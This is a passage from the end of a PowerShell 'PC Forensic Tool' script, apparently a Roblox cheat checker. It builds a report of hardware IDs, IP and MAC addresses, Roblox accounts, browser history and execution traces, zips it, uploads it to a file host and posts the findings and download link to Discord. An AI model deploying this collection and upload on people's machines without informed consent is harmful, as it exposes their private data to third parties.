Last Boot: $($systemInfo.LastBootTime)
Uptime: $($systemInfo.Uptime)

Hardware:
- Manufacturer: $($systemInfo.Manufacturer)
- Model: $($systemInfo.Model)
- BIOS: $($systemInfo.BIOSVersion) ($($systemInfo.BIOSManufacturer))
- Serial: $($systemInfo.SerialNumber)
- RAM: $($systemInfo.TotalRAM) GB
- Processor: $($systemInfo.ProcessorName) ($($systemInfo.ProcessorCores) cores / $($systemInfo.ProcessorThreads) threads)
- GPU: $($systemInfo.GPUName) (Driver: $($systemInfo.GPUDriverVersion))

Network:
- IP Address: $($systemInfo.IPAddress)
- MAC Address: $($systemInfo.MACAddress)
- DNS Servers: $($systemInfo.DNSServers)
- DHCP: $($systemInfo.DHCPEnabled) (Server: $($systemInfo.DHCPServer))

==============================================================================
DETECTION STATISTICS
==============================================================================

Pattern Matches (pot, matrix, seliware, etc.): $($patternMatches.Count)
Roblox Accounts Found: $($robloxAccounts.Count)
.cfg Files Found: $($cfgFiles.Count)
.exe Files Found: $($exeFiles.Count)
Suspicious Items: $($suspiciousItems.Count)

==============================================================================
PATTERN MATCHES (CRITICAL)
==============================================================================

$(if ($patternMatches.Count -gt 0) {
    $patternMatches | Select-Object -First 20 | ForEach-Object { "❌ $_" } | Out-String
    if ($patternMatches.Count -gt 20) { "... and $($patternMatches.Count - 20) more (see PATTERN_MATCHES.txt)" }
} else {
    "✓ No pattern matches found"
})

==============================================================================
ROBLOX ACCOUNTS
==============================================================================

$(if ($robloxAccounts.Count -gt 0) {
    $robloxAccounts | ForEach-Object { "- $_" } | Out-String
} else {
    "None found"
})

==============================================================================
SUSPICIOUS FINDINGS
==============================================================================

$(if ($suspiciousItems.Count -gt 0) {
    $suspiciousItems | Sort-Object -Unique | Select-Object -First 15 | ForEach-Object { "❌ $_" } | Out-String
    if ($suspiciousItems.Count -gt 15) { "... and $($suspiciousItems.Count - 15) more" }
} else {
    "✓ No suspicious items detected"
})

==============================================================================
FILES GENERATED
==============================================================================

- FULL_LOG.txt - Complete scan log
- SUMMARY_REPORT.txt - This summary
- PATTERN_MATCHES.txt - All pattern search results
- CFG_FILES.txt - All .cfg files found
- EXE_FILES.txt - All .exe files found
- ROBLOX_ACCOUNTS.txt - Roblox account data
- BROWSER_HISTORY.txt - Browser history from all browsers
- DELETED_FILES.txt - Deleted files analysis
- MUICACHE.txt - Application execution history
- PROCESSES.txt - Running processes
- PROGRAMS.txt - Installed software

==============================================================================
"@

$summary | Out-File $summaryFile
Write-Log "Summary report created: $summaryFile" "Green"

$zipFile = "$env:TEMP\Forensics_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
Write-Log "`n[*] Creating ZIP archive..." "Yellow"
Compress-Archive -Path "$outputDir\*" -DestinationPath $zipFile -Force
Write-Log "ZIP created: $zipFile" "Green"

$uploadResult = Upload-File -FilePath $zipFile

if ($uploadResult -and $uploadResult.url) {
    Write-Log "`n$(Get-Separator)" "Cyan"
    Write-Log "SENDING RESULTS TO DISCORD..." "Yellow"
    Write-Log "$(Get-Separator)" "Cyan"
    
    $embedColor = if ($isSuspicious) { 15158332 } else { 3066993 }
    
    $fields = @(
        @{ name = "🖥️ Computer"; value = $systemInfo.ComputerName; inline = $true }
        @{ name = "👤 User"; value = $systemInfo.Username; inline = $true }
        @{ name = "🕐 Scan Time"; value = $systemInfo.CurrentTime; inline = $false }
        @{ name = "💿 OS"; value = "$($systemInfo.OSName) (Build $($systemInfo.OSBuild))"; inline = $true }
        @{ name = "⏰ Uptime"; value = $systemInfo.Uptime; inline = $true }
        @{ name = "📅 Install Date"; value = $systemInfo.InstallDate.ToString("yyyy-MM-dd"); inline = $true }
        @{ name = "🌐 IP Address"; value = $systemInfo.IPAddress; inline = $true }
        @{ name = "📍 MAC Address"; value = $systemInfo.MACAddress; inline = $true }
        @{ name = "💾 RAM"; value = "$($systemInfo.TotalRAM) GB"; inline = $true }
        @{ name = "🔧 Processor"; value = "$($systemInfo.ProcessorName) ($($systemInfo.ProcessorCores)C/$($systemInfo.ProcessorThreads)T)"; inline = $false }
        @{ name = "🎮 GPU"; value = "$($systemInfo.GPUName) (Driver: $($systemInfo.GPUDriverVersion))"; inline = $false }
        @{ name = "🏭 Manufacturer"; value = "$($systemInfo.Manufacturer) $($systemInfo.Model)"; inline = $true }
        @{ name = "🔢 Serial"; value = $systemInfo.SerialNumber; inline = $true }
        @{ name = "💽 Drives Scanned"; value = $($allDrives.Name -join ', '); inline = $true }
        @{ name = "━━━━━ DETECTION RESULTS ━━━━━"; value = "** **"; inline = $false }
        @{ name = "🎯 Pattern Matches"; value = "$($patternMatches.Count) found"; inline = $true }
        @{ name = "🎮 Roblox Accounts"; value = "$($robloxAccounts.Count) found"; inline = $true }
        @{ name = "⚙️ .cfg Files"; value = "$($cfgFiles.Count) found"; inline = $true }
        @{ name = "📦 .exe Files"; value = "$($exeFiles.Count) found"; inline = $true }
        @{ name = "⚠️ Suspicious Items"; value = "$($suspiciousItems.Count) detected"; inline = $true }
    )
    
    if ($patternMatches.Count -gt 0) {
        $uniquePatterns = $patternMatches | Select-Object -First 5
        $patternList = ($uniquePatterns | ForEach-Object { "• $_" }) -join "`n"
        if ($patternMatches.Count -gt 5) {
            $patternList += "`n... and $($patternMatches.Count - 5) more (see full report)"
        }
        $fields += @{ name = "🔴 CRITICAL - Pattern Matches"; value = $patternList; inline = $false }
    }
    
    if ($robloxAccounts.Count -gt 0) {
        $uniqueAccounts = $robloxAccounts | Select-Object -Unique -First 5
        $robloxList = ($uniqueAccounts | ForEach-Object { "• $_" }) -join "`n"
        if ($robloxAccounts.Count -gt 5) {
            $robloxList += "`n... and $($robloxAccounts.Count - 5) more"
        }
        $fields += @{ name = "🎮 Roblox Accounts"; value = $robloxList; inline = $false }
    }
    
    if ($suspiciousItems.Count -gt 0) {
        $uniqueSuspicious = $suspiciousItems | Select-Object -Unique -First 3
        $suspList = ($uniqueSuspicious | ForEach-Object { "• $_" }) -join "`n"
        if ($suspiciousItems.Count -gt 3) {
            $suspList += "`n... and $($suspiciousItems.Count - 3) more"
        }
        $fields += @{ name = "⚠️ Suspicious Findings"; value = $suspList; inline = $false }
    }
    
    $fields += @{ 
        name = "📥 DOWNLOAD FULL REPORT" 
        value = "**[$($uploadResult.url)]($($uploadResult.url))**`n`nService: $($uploadResult.service)`nExpires: $($uploadResult.expiry)" 
        inline = $false 
    }
    
    $embed = @{
        title = if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✅ SYSTEM SCAN COMPLETE - CLEAN" }
        description = "**Comprehensive PC Forensic Analysis Report v3.3**`nALL DRIVES scanned - Enhanced pattern matching"
        color = $embedColor
        fields = $fields
        footer = @{
            text = "PC Forensic Tool v3.3 | ALL DRIVES | Enhanced Matching | Scan ID: $timestamp"
        }
        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    
    Send-DiscordMessage -Content "**🔍 Forensic Analysis Complete - ALL DRIVES**" -Embeds @($embed)
} else {
    Write-Log "`n[!] Upload failed - Sending basic report to Discord..." "Yellow"
    
    $fields = @(
        @{ name = "⚠️ Status"; value = "Upload Failed - Results saved locally only"; inline = $false }
        @{ name = "Computer"; value = $systemInfo.ComputerName; inline = $true }
        @{ name = "User"; value = $systemInfo.Username; inline = $true }
        @{ name = "Drives Scanned"; value = $($allDrives.Name -join ', '); inline = $true }
        @{ name = "Pattern Matches"; value = "$($patternMatches.Count)"; inline = $true }
        @{ name = "Roblox Accounts"; value = "$($robloxAccounts.Count)"; inline = $true }
        @{ name = "Status"; value = if ($isSuspicious) { "SUSPICIOUS" } else { "Clean" }; inline = $true }
        @{ name = "Local Folder"; value = $outputDir; inline = $false }
    )
    
    $embed = @{
        title = "⚠️ Upload Failed"
        description = "Scan completed but file upload failed. Results saved locally only."
        color = 15158332
        fields = $fields
        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    
    Send-DiscordMessage -Content "**Upload Failed - Scan Complete**" -Embeds @($embed)
}

Remove-Item $zipFile -Force -ErrorAction SilentlyContinue

Write-Log "`n$(Get-Separator)" "Cyan"
Write-Log "SCAN COMPLETE!" "Green"
Write-Log "Status: $(if ($isSuspicious) { '⚠️ SUSPICIOUS' } else { '✓ CLEAN' })" $(if ($isSuspicious) { "Red" } else { "Green" })
Write-Log "Drives Scanned: $($allDrives.Name -join ', ')" "Cyan"
Write-Log "Pattern Matches: $($patternMatches.Count)" "Cyan"
Write-Log "Roblox Accounts: $($robloxAccounts.Count)" "Cyan"
Write-Log "Results folder: $outputDir" "Cyan"
if ($uploadResult) {
    Write-Log "Download link: $($uploadResult.url)" "Cyan"
    Write-Log "Service: $($uploadResult.service) | Expires: $($uploadResult.expiry)" "Yellow"
}
Write-Log "$(Get-Separator)" "Cyan"

Start-Process explorer.exe $outputDir

Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")